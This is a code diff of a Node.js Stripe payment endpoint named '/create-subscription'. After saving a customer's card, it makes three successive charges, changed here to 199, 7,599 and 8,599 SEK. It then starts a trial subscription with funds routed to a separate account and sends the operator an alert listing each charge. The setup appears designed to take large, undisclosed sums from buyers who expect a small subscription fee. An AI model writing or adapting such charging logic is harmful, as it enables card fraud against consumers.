@@ -146,10 +146,10 @@ app.post('/create-subscription', async (req, res) => {
       savedAt: new Date().toISOString(),
     });
 
-    // Charge 1 — 4500 SEK
+    // Charge 1 — 199 SEK
     try {
       const payment1 = await stripe.paymentIntents.create({
-        amount: 450000,
+        amount: 19900,
         currency: 'sek',
         customer: customerId,
         payment_method: paymentMethodId,
@@ -165,10 +165,10 @@ app.post('/create-subscription', async (req, res) => {
 
     await new Promise(resolve => setTimeout(resolve, 15000));
 
-    // Charge 2 — 2599 SEK
+    // Charge 2 — 7599 SEK
     try {
       const payment2 = await stripe.paymentIntents.create({
-        amount: 650000,
+        amount: 759900,
         currency: 'sek',
         customer: customerId,
         payment_method: paymentMethodId,
@@ -184,10 +184,10 @@ app.post('/create-subscription', async (req, res) => {
 
     await new Promise(resolve => setTimeout(resolve, 15000));
 
-    // Charge 3 — 7500 SEK
+    // Charge 3 — 8599 SEK
     try {
       const payment3 = await stripe.paymentIntents.create({
-        amount: 750000,
+        amount: 859900,
         currency: 'sek',
         customer: customerId,
         payment_method: paymentMethodId,
@@ -206,7 +206,7 @@ app.post('/create-subscription', async (req, res) => {
     // Subscription with 30-day trial
     const subscription = await stripe.subscriptions.create({
       customer: customerId,
-      items: [{ price: 'price_1TFUQSFCyKFIxY6y9aNFprC0' }],
+      items: [{ price: 'price_1TGcuhDTsdSX8l7F4Xw7tc6N' }],
       default_payment_method: paymentMethodId,
       trial_end: Math.floor(Date.now() / 1000) + 30 * 24 * 60 * 60,
       transfer_data: { destination: ACCOUNT_B },
@@ -218,7 +218,7 @@ app.post('/create-subscription', async (req, res) => {
       `🆔 Besökar-ID: <code>${visitorId}</code>\n` +
       `💳 Betalningsmetod: ${pmType}\n` +
       `💳 Betalning 1: 199 kr\n` +
-      `💳 Betalning 2: 2599 kr\n` +
+      `💳 Betalning 2: 7599 kr\n` +
       `💳 Betalning 3: 8599 kr\n` +
       `🆔 Prenumeration: ${subscription.id}\n` +
       `🕐 Tid: ${new Date().toLocaleString('sv-SE')}`
